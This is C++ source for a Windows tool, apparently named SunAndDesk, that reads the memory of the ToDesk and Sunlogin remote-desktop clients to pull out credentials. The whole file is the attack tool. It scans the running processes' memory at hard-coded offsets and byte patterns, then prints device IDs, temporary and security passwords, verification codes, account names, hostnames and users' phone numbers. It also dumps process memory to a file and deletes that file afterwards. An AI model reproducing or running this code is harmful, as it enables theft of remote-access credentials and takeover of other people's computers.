#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <cstdio> 
#include <windows.h>
#include <tlhelp32.h>
#include <chrono>
#include <iomanip>         
#include <ctime>           
#include <sstream>


//��ȡ�豸��
void ExtractValue(HANDLE hProcess, LPCVOID address) {
    // ƫ�� 32 �ֽ�
    LPCVOID offsetAddress = (void*)((char*)address + 0x20);

    // ��ȡƫ�Ƶ�ַ�������ݣ�����Ŀ��ֵΪ 9 �ֽڣ�
    std::vector<unsigned char> buffer(9);
    SIZE_T bytesRead;

    ReadProcessMemory(hProcess, offsetAddress, buffer.data(), buffer.size(), &bytesRead);

    // ת��Ϊ�ַ�������ӡ
    std::string extractedValue(buffer.begin(), buffer.end());
    std::cout << "[+] ToDesk �豸��: " << extractedValue << std::endl;
}
//��ȡ��ʱ����
void ExtractName(HANDLE hProcess, LPCVOID address) {
    // ƫ�� 224 �ֽ�
    LPCVOID offsetAddress = (void*)((char*)address - 224);

    // ��ȡƫ�Ƶ�ַ�������ݣ�����Ŀ��ֵΪ 9 �ֽڣ�
    std::vector<unsigned char> buffer(8);
    SIZE_T bytesRead;

    ReadProcessMemory(hProcess, offsetAddress, buffer.data(), buffer.size(), &bytesRead);

    // ת��Ϊ�ַ�������ӡ
    std::string extractedValue(buffer.begin(), buffer.end());
    std::cout << "[+] ToDesk ��ʱ����: " << extractedValue << std::endl;
}
//��ȡ��ȫ����
void ExtractSafe(HANDLE hProcess, LPCVOID address) {
    // ƫ�� 224 �ֽ�
    LPCVOID offsetAddress = (void*)((char*)address - 192);
    // ����һ����̬��С�Ļ��������ڶ�ȡ����
    std::vector<unsigned char> buffer;
    SIZE_T bytesRead;
    unsigned char byte;
    // ���϶�ȡ�ڴ棬ֱ������ 0x00 �ֽ�
    while (true) {
        // ��ȡһ���ֽ�
        if (!ReadProcessMemory(hProcess, offsetAddress, &byte, sizeof(byte), &bytesRead) || bytesRead != sizeof(byte)) {
            std::cerr << "��ȡ�ڴ�ʧ��!" << std::endl;
            break;
        }
        // ������� 0x00 �ֽڣ���ֹͣ��ȡ
        if (byte == 0x00) {
            break;
        }
        // ���ֽ�׷�ӵ�������
        buffer.push_back(byte);

        // ����ƫ�Ƶ�ַ��������ȡ��һ���ֽ�
        offsetAddress = (void*)((char*)offsetAddress + 1);
    }
    // ת��Ϊ�ַ�������ӡ
    std::string extractedValue(buffer.begin(), buffer.end());
    std::cout << "[+] ToDesk ��ȫ����: " << extractedValue << std::endl;
}
//��ȡ�绰����
void ExtractPhone(HANDLE hProcess, LPCVOID address) {
    // ƫ�� 224 �ֽ�
    LPCVOID offsetAddress = (void*)((char*)address + 544);

    // ��ȡƫ�Ƶ�ַ�������ݣ�����Ŀ��ֵΪ 9 �ֽڣ�
    std::vector<unsigned char> buffer(11);
    SIZE_T bytesRead;

    ReadProcessMemory(hProcess, offsetAddress, buffer.data(), buffer.size(), &bytesRead);

    // ת��Ϊ�ַ�������ӡ
    std::string extractedValue(buffer.begin(), buffer.end());
    std::cout << "[+] ToDesk ��¼�ߵ绰: " << extractedValue << std::endl;
}
//��ȡ��ַƫ����
BOOL ProcessMemory(HANDLE hProcess, LPCVOID address, SIZE_T size, const std::string& targetDate) {
    std::vector<unsigned char> buffer(size);
    SIZE_T bytesRead;

    // ��ȡ�ڴ�
    ReadProcessMemory(hProcess, address, buffer.data(), size, &bytesRead);

    // �ڶ�ȡ���ڴ��в���Ŀ������
    std::string memString(buffer.begin(), buffer.begin() + bytesRead);

    size_t foundPos = memString.find(targetDate);
    if (foundPos != std::string::npos) {
        LPCVOID foundAddress = (void*)((char*)address + foundPos);
        std::cout << "[+] ToDesk " << std::endl << std::endl;
        // ��ȡƫ�ƺ��ֵ
        ExtractValue(hProcess, foundAddress);
        // ��ȡƫ�ƺ���ʱ����
        ExtractName(hProcess, foundAddress);
        //��ȡ��ȫ����
        ExtractSafe(hProcess, foundAddress);
        //��ȡ�绰
        ExtractPhone(hProcess, foundAddress);
        return true;
    }
    return false;
}
//��ȡ��ǰ����
std::string GetCurrentDate() {
    auto now = std::chrono::system_clock::now();
    auto time = std::chrono::system_clock::to_time_t(now);
    std::tm tm;
    localtime_s(&tm, &time);

    std::ostringstream oss;
    oss << std::put_time(&tm, "%Y%m%d");
    return oss.str();
}

// ��ʮ�������ַ���ת��Ϊ�ֽ�����
std::vector<unsigned char> HexStringToBytes(const std::string& hex) {
    std::vector<unsigned char> bytes;
    for (size_t i = 0; i < hex.length(); i += 2) {
        unsigned char byte = static_cast<unsigned char>(std::stoi(hex.substr(i, 2), nullptr, 16));
        bytes.push_back(byte);
    }
    return bytes;
}
// ���ļ�������ƥ����ֽ�ģʽ
size_t FindPatternInFile(const std::string& filePath, const std::vector<unsigned char>& pattern) {
    std::ifstream file(filePath, std::ios::binary);
    if (!file) {
        std::cerr << "Failed to open file: " << filePath << std::endl;
        return std::string::npos;
    }

    // ���ֽڶ�ȡ�ļ����ݽ���ƥ��
    std::vector<unsigned char> buffer(pattern.size());
    size_t offset = 0;
    while (file.read(reinterpret_cast<char*>(buffer.data()), pattern.size())) {
        if (std::equal(buffer.begin(), buffer.end(), pattern.begin())) {
            return offset;
        }
        offset++;
        file.seekg(offset, std::ios::beg); // �ص���һ��λ�ü������
    }

    return std::string::npos;
}
// ��ȡ����ӡģʽ֮��� ASCII ����
void ExtractAndPrintAscii(const std::string& filePath, size_t startOffset, size_t endOffset) {
    std::ifstream file(filePath, std::ios::binary);
    if (!file) {
        std::cerr << "Failed to open file: " << filePath << std::endl;
        return;
    }

    // �ƶ�����ʼƫ��λ��
    file.seekg(startOffset, std::ios::beg);

    // �������ݴ�С
    size_t dataSize = endOffset - startOffset;
    std::vector<unsigned char> data(dataSize);

    // ��ȡ����
    file.read(reinterpret_cast<char*>(data.data()), dataSize);

    // ��ӡ����Ϊ ASCII
    for (unsigned char byte : data) {
        if (std::isprint(byte)) {
            std::cout << byte; // ��ӡ�ɼ��ַ�
        }
        else {
            std::cout << '.'; // ���ɼ��ַ��滻Ϊ '.'
        }
    }
}
// ��ȡ�����ڴ沢���浽�ļ�
bool CreateMemoryDump(HANDLE hProcess, const std::string& dumpFilePath) {
    std::ofstream dumpFile(dumpFilePath, std::ios::binary);
    if (!dumpFile.is_open()) {
        std::cerr << "Failed to open dump file: " << dumpFilePath << std::endl;
        return false;
    }

    MEMORY_BASIC_INFORMATION mbi;
    LPCVOID address = 0;
    SIZE_T bytesRead;

    // ���������ڴ�����
    while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        if (mbi.State == MEM_COMMIT && mbi.Protect != PAGE_NOACCESS && mbi.Protect != PAGE_GUARD) {
            std::vector<unsigned char> buffer(mbi.RegionSize);
            if (ReadProcessMemory(hProcess, mbi.BaseAddress, buffer.data(), mbi.RegionSize, &bytesRead)) {
                dumpFile.write(reinterpret_cast<const char*>(buffer.data()), bytesRead);
            }
        }
        address = (LPCVOID)((char*)mbi.BaseAddress + mbi.RegionSize);
    }

    dumpFile.close();
    std::cout << "Memory dump created at: " << dumpFilePath << std::endl;
    return true;
}
// ��ȡ���̵� PID
DWORD GetConsoleProcessID(const std::wstring& targetProcessName) {
    // ��������
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to create snapshot. Error: " << GetLastError() << std::endl;
        return 0;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    DWORD consoleSessionID = WTSGetActiveConsoleSessionId();

    // ���������б�
    if (Process32First(hSnapshot, &pe32)) {
        do {
            // �����������Ƿ�ƥ��
            if (_wcsicmp(pe32.szExeFile, targetProcessName.c_str()) == 0) {
                // ��ȡ���̵� Session ID
                DWORD sessionID = 0;
                ProcessIdToSessionId(pe32.th32ProcessID, &sessionID);

                // ƥ�������� Console �Ľ���
                if (sessionID == consoleSessionID) {
                    std::wcout << L"Found console process: " << targetProcessName
                        << L" (PID: " << pe32.th32ProcessID << L")" << std::endl;

                    CloseHandle(hSnapshot);
                    return pe32.th32ProcessID; // ���� PID
                }
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return 0; // δ�ҵ�ƥ��Ľ���
}

void PrintUserId(std::string dumpFilePath) {
    std::string startPatternHex = "00406D6D0A2A02000001010A092273656374696F6E22203A2022";
    std::string endPatternHex = "222C0A092276616C756522203A202230220A7D0A0000000100000000000000CF4CA1136C49";

    // ת��ʮ������ģʽ���ֽ�����
    std::vector<unsigned char> patternbegin = HexStringToBytes(startPatternHex);
    std::vector<unsigned char> patternend = HexStringToBytes(endPatternHex);

    // ���ļ��в���ģʽ
    size_t startOffset = FindPatternInFile(dumpFilePath, patternbegin);
    size_t endOffset = FindPatternInFile(dumpFilePath, patternend);

    if (startOffset != std::string::npos && endOffset != std::string::npos && startOffset < endOffset) {
       /* std::cout << "Pattern found in memory dump." << std::endl;
        std::cout << "Start Offset: 0x" << std::hex << startOffset << std::endl;
        std::cout << "End Offset: 0x" << std::hex << endOffset << std::endl;*/

        // ��ȡ����ӡ�м�ֵ
        std::cout << "[+] �û��˻�: "; ExtractAndPrintAscii(dumpFilePath, startOffset + patternbegin.size(), endOffset); std::cout << std::endl;
    }
}
void PrintHostname(std::string dumpFilePath) {
    std::string startPatternHex = "008665B3142A0200924C4F474F4E5345525645523D5C5C";
    std::string endPatternHex = "00000000000000000000008565B4142A03008E4F6E654472697665";

    // ת��ʮ������ģʽ���ֽ�����
    std::vector<unsigned char> patternbegin = HexStringToBytes(startPatternHex);
    std::vector<unsigned char> patternend = HexStringToBytes(endPatternHex);

    // ���ļ��в���ģʽ
    size_t startOffset = FindPatternInFile(dumpFilePath, patternbegin);
    size_t endOffset = FindPatternInFile(dumpFilePath, patternend);

    if (startOffset != std::string::npos && endOffset != std::string::npos && startOffset < endOffset) {
        /*std::cout << "Pattern found in memory dump." << std::endl;
        std::cout << "Start Offset: 0x" << std::hex << startOffset << std::endl;
        std::cout << "End Offset: 0x" << std::hex << endOffset << std::endl;*/

        // ��ȡ����ӡ�м�ֵ
        std::cout << "[+] ��������: "; ExtractAndPrintAscii(dumpFilePath, startOffset + patternbegin.size(), endOffset); std::cout << std::endl;
    }
}
void PrintConsole(std::string dumpFilePath) {
    std::string startPatternHex = "22637572737461747573222000000000000000000F000000000000006B";
    std::string endPatternHex = "0A0909220B000000000000000F00000000000000002266617374636F646522";

    // ת��ʮ������ģʽ���ֽ�����
    std::vector<unsigned char> patternbegin = HexStringToBytes(startPatternHex);
    std::vector<unsigned char> patternend = HexStringToBytes(endPatternHex);

    // ���ļ��в���ģʽ
    size_t startOffset = FindPatternInFile(dumpFilePath, patternbegin);
    size_t endOffset = FindPatternInFile(dumpFilePath, patternend);

    if (startOffset != std::string::npos && endOffset != std::string::npos && startOffset < endOffset) {
       /* std::cout << "Pattern found in memory dump." << std::endl;
        std::cout << "Start Offset: 0x" << std::hex << startOffset << std::endl;
        std::cout << "End Offset: 0x" << std::hex << endOffset << std::endl;*/

        // ��ȡ����ӡ�м�ֵ
        std::cout << "[+] �豸ʶ����: "; ExtractAndPrintAscii(dumpFilePath, startOffset + patternbegin.size(), endOffset); std::cout << std::endl;
    }
}
void PrintCheckCode(std::string dumpFilePath) {
    std::string startPatternHex = "6034700A2A0200003C6620663D79616865692E323820633D636F6C6F725F65646974203E";
    std::string endPatternHex = "3C2F663E000028258247F67F0000C56EEE150063";

    // ת��ʮ������ģʽ���ֽ�����
    std::vector<unsigned char> patternbegin = HexStringToBytes(startPatternHex);
    std::vector<unsigned char> patternend = HexStringToBytes(endPatternHex);

    // ���ļ��в���ģʽ
    size_t startOffset = FindPatternInFile(dumpFilePath, patternbegin);
    size_t endOffset = FindPatternInFile(dumpFilePath, patternend);

    if (startOffset != std::string::npos && endOffset != std::string::npos && startOffset < endOffset) {
        /*std::cout << "Pattern found in memory dump." << std::endl;
        std::cout << "Start Offset: 0x" << std::hex << startOffset << std::endl;
        std::cout << "End Offset: 0x" << std::hex << endOffset << std::endl;*/

        // ��ȡ����ӡ�м�ֵ
        std::cout << "[+] �豸��֤��: "; ExtractAndPrintAscii(dumpFilePath, startOffset + patternbegin.size(), endOffset); std::cout << std::endl;
    }
}
void PrintPhone(std::string dumpFilePath) {
    std::string startPatternHex = "3C2F646174613E3C6461746120747970653D226669656C6422206E616D653D226D6F62696C65223E";
    std::string endPatternHex = "3C2F646174613E3C6461746120747970653D226669656C6422206E616D653D22656D61696C223E";

    // ת��ʮ������ģʽ���ֽ�����
    std::vector<unsigned char> patternbegin = HexStringToBytes(startPatternHex);
    std::vector<unsigned char> patternend = HexStringToBytes(endPatternHex);

    // ���ļ��в���ģʽ
    size_t startOffset = FindPatternInFile(dumpFilePath, patternbegin);
    size_t endOffset = FindPatternInFile(dumpFilePath, patternend);

    if (startOffset != std::string::npos && endOffset != std::string::npos && startOffset < endOffset) {
        /*std::cout << "Pattern found in memory dump." << std::endl;
        std::cout << "Start Offset: 0x" << std::hex << startOffset << std::endl;
        std::cout << "End Offset: 0x" << std::hex << endOffset << std::endl;*/

        // ��ȡ����ӡ�м�ֵ
        std::cout << "[+] ��¼�û��绰 : "; ExtractAndPrintAscii(dumpFilePath, startOffset + patternbegin.size(), endOffset); std::cout << std::endl;
    }
}

int Sunlon() {
    // ����Ŀ���������
    std::wstring processName = L"SunloginClient.exe"; // �滻ΪĿ�������
    std::string dumpFilePath = "process_dump.bin";   // ���� Dump �ļ�·��
    // ��ȡĿ����̵� PID
    DWORD pid = GetConsoleProcessID(processName);
    // ��Ŀ�����
    HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
    // �����ڴ�ת���ļ�
    CreateMemoryDump(hProcess, dumpFilePath);
    std::cout << "[+] ���տ� " << std::endl << std::endl;
    //��ӡ�û��˻�
    PrintUserId(dumpFilePath);
    //��ӡ������
    PrintHostname(dumpFilePath);
    //��ӡ�豸��
    PrintConsole(dumpFilePath);
    //��ӡ��֤��
    PrintCheckCode(dumpFilePath);
    //��ӡ�绰����
    PrintPhone(dumpFilePath);
    remove(dumpFilePath.c_str());
    std::cout << "File '" << dumpFilePath << "' has been deleted successfully." << std::endl;
    CloseHandle(hProcess);
    return 0;
}

int ToDesk() {
    DWORD pid;

    std::wstring targetProcessName = L"ToDesk.exe";

    pid = GetConsoleProcessID(targetProcessName);

    std::string targetDate = GetCurrentDate();

    HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);

    MEMORY_BASIC_INFORMATION mbi;
    LPCVOID address = 0;
    BOOL check;
    while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        if (mbi.State == MEM_COMMIT && mbi.Protect != PAGE_NOACCESS && mbi.Protect != PAGE_GUARD) {
            check =  ProcessMemory(hProcess, mbi.BaseAddress, mbi.RegionSize, targetDate);
            if (check)
            {
                CloseHandle(hProcess);
                system("pause");
                return 0;
            }
        }
        address = (LPCVOID)((char*)mbi.BaseAddress + mbi.RegionSize);
    }

    CloseHandle(hProcess);
    system("pause");
    return 0;
}

int main(int argc, char* argv[]) {
      
    if (argc < 2) {
        std::cout << "Dump use ---> SunAndDesk.exe <Sunlon>( or )<ToDesk>" << std::endl;
        return 1;
    }
    std::string opertor = argv[1];
    if (opertor == "Sunlon") {
        Sunlon();
    }
    else if (opertor == "ToDesk") {
        ToDesk();
    }
    system("pause");
    return 0;
}